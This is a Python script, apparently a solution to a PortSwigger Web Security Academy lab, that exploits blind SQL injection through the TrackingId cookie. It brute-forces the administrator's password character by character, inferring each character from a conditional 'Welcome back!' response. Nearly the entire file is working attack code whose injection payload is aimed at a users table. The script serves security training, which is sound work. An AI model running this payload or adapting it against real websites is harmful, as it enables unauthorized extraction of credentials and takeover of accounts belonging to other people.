import string
import requests

""" Exploiting blind SQL injection by triggering conditional responses
# https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses

The original SQL-query is something like this:
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = '<TrackingId from cookie>'
"""

# TODO: change url to challenge url
url = "https://acaa1fd81fd8c2648031010300c6005c.web-security-academy.net/"


def get_candidates_alphanumeric():
    """this challenge only uses lowercase and numbers.
    To be sure - and for future copy/paste - don't forget the uppercase letters"""
    return string.ascii_lowercase + "0123456789" + string.ascii_uppercase


def bruteforce_password(candidates):
    """getting the password, one character at a time"""

    password = ""
    pos = len(password)
    while True:
        pos += 1
        for candidate in candidates:
            to_try = password + candidate

            injection = f"' OR SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 1, {len(to_try)}) = '{to_try}'"

            payload = injection + " -- "
            # print(f"SELECT TrackingId FROM TrackedUsers WHERE TrackingId = '{payload}'")

            cookies = {"session": "whatever",  # no valid session needed
                       "TrackingId": payload, }

            res = requests.get(url, cookies=cookies, timeout=5)

            if "Welcome back!" in res.text:
                password += candidate
                print(password)
                break
            else:
                print(".", end="")
        else:
            print(f" tried all candidates for position {pos}, complete password:", password)
            break

        # unreachable, due to breaks

    return password


if __name__ == '__main__':
    candidates = get_candidates_alphanumeric()
    password = bruteforce_password(candidates)
    print(password)
